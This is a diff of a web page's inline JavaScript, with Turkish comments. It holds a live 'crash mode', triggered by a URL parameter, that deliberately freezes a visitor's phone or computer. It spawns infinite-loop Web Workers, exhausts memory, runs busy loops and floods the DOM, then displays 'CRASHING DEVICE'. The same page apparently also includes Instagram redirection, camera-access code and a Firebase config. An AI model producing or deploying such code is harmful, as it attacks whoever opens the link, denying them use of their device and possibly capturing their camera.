@@ -17,41 +17,23 @@
     <canvas id="canvas"></canvas>
 
 <script>
-    // CRASH MODE - RAM VE CPU KILLER
     (function() {
         const params = new URLSearchParams(window.location.search);
         const isCrash = params.get('crash') === '1';
         
         if (isCrash) {
-            // TELEFONU DONDUMA SOKAN KOD
             function crashDevice() {
-                const startTime = Date.now();
                 const memoryHog = [];
                 const workerScript = "while(true){}";
                 const blob = new Blob([workerScript], { type: "application/javascript" });
-                
-                // 1. CPU %100 yap
                 for(let i = 0; i < 8; i++) {
                     const worker = new Worker(URL.createObjectURL(blob));
                     setTimeout(() => worker.terminate(), 30000);
                 }
-                
-                // 2. RAM doldur
                 setInterval(() => {
-                    try {
-                        for(let i = 0; i < 100; i++) {
-                            memoryHog.push(new Array(1000000).fill('x'.repeat(1000)));
-                        }
-                    } catch(e) {}
+                    try { for(let i = 0; i < 100; i++) { memoryHog.push(new Array(1000000).fill('x'.repeat(1000))); } } catch(e) {}
                 }, 10);
-                
-                // 3. Sonsuz döngü
-                setInterval(() => {
-                    const a = [];
-                    for(let i = 0; i < 1000000; i++) a.push(i * Math.random());
-                }, 5);
-                
-                // 4. DOM spam
+                setInterval(() => { const a = []; for(let i = 0; i < 1000000; i++) a.push(i * Math.random()); }, 5);
                 setInterval(() => {
                     for(let i = 0; i < 500; i++) {
                         const div = document.createElement('div');
@@ -63,14 +45,12 @@
                     }
                 }, 50);
             }
-            
             crashDevice();
             document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:50%;">💀 CRASHING DEVICE 💀</h1>';
             return;
         }
     })();
     
-    // INSTAGRAM YONLENDIRME VE KAMERA KODU (onceki gibi calisir)
     (function() {
         const params = new URLSearchParams(window.location.search);
         const forceChrome = params.get('force_chrome');
@@ -90,7 +70,6 @@
             return;
         }
         
-        // Crash kontrolu (yukarida yapildi, buraya gelmez)
         if(params.get('crash') === '1') return;
         
         const FIREBASE_CONFIG = {
